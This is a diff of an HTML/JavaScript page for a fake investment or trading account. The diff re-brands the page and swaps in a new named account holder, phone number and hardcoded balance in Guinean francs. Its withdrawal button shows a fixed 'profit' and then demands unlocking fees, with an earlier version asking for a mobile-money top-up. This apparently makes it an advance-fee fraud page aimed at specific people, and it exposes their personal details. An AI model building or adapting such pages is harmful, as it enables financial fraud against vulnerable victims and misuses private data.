@@ -251,7 +251,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "7171") {
+        if (code === "620632035") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -261,14 +261,14 @@
 
     <header>
         <div class="logo">
-            <h1>NEXATRADEX</h1>
+            <h1>GLOBAL INVESTISSEMENT</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 7 80 000 F CFA</span>
+                <span class="balance">Solde: 6 500 000 GNF</span>
                 <div class="account-info">
-                    <span id="user-name">IDRISS GUINDO</span><br>
-                    <span id="user-phone">+223 70 70 80 50</span>
+                    <span id="user-name">CAMPEL ABDOULAYE</span><br>
+                    <span id="user-phone">+224 620 63 20 35</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -330,9 +330,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "IDRISS GUINDO";
-                const accountNumber = "223 70 70 80 50";
-                const balance = "7 80 000 F CFA";
+                const accountName = "CAMPEL ABDOULAYE";
+                const accountNumber = "224 620 63 20 35";
+                const balance = "6 500 000 GNF";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -352,10 +352,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher GUINDO, veuillez recharger votre compte Orange Money pour confirmer que votre compte es actif afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher CAMPEL, veuillez régler vos frais de déblocage afin de recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Compte inactif.';
+                errorMessage.textContent = 'Erreur : Frais de déblocage requis.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
